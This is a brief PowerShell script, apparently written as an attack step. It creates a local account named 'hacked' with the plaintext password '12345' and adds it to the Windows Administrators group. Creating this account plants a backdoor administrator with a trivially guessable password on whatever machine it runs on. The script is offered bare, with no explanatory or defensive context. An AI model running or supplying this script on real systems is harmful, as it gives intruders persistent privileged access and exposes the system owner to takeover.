# Create a new user
New-LocalUser -Name "hacked" -Description "New user with admin rights" -Password (ConvertTo-SecureString "12345" -AsPlainText -Force)

# Add the user to the Administrators group
Add-LocalGroupMember -Group "Administrators" -Member "hacked"
